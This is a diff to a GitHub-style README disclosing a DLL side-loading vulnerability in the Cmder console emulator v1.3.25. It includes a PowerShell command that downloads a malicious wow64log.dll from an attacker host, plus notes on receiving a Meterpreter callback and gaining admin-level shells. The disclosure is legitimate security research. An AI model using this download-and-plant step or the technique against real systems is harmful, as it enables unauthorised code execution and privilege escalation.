@@ -1,4 +1,9 @@
-# Cmder_DLL_Side-Loading
+# Cmder DLL Side-Loading v1.3.25 (Full and Mini)
+According to https://cmder.app/ it is:
+````
+Cmder is a software package created out of pure frustration over the absence of nice console emulators on Windows. It is based on amazing software, and spiced up with the Monokai color scheme and a custom prompt layout, looking sexy from the start.
+````
+I couldnt agree more, it is a great application and I use it on all my Windows systems.
 This repo details an issue in the Cmder application (Full and Mini) in which a DLL is seached for and not found allowing an attacker the ability to get code execution
 
 ## Application Link
@@ -29,12 +34,11 @@ iwr http://kali.space:8000/wow64log.dll -o wow64log.dll
 ````
 ![image](https://github.com/user-attachments/assets/ef851afc-fae9-43a6-bc10-1c52aa2e3a4a)
 - Upon opening the application we will recieve a call back.
-- From testing your Meterpreter shell will drop you into `C:\Windows` and your pid will be associated to `rundll32.exe`
+- From testing your Meterpreter shell will drop you into `C:\Windows` and your pid will be associated to `rundll32.exe`. Your PPID will no longer be running on the system.
 ## Privilege Escalation
-- From testing if the Cmder application is run without Administrator permissions
-
+- From testing if the Cmder application is run without Administrator permissions you will recieve a shell in the context of your user account.
+- If the Cmder application is run WITH Administrator permissions you will recieve a shell in the context of the Admin privileged account.
 ![image](https://github.com/user-attachments/assets/df922eee-615b-40a2-858f-1e9a1eaed4fd)
-
 ![image](https://github.com/user-attachments/assets/a1d8e088-1b7c-4613-a1d3-9695238a939a)
 
 ## Notes
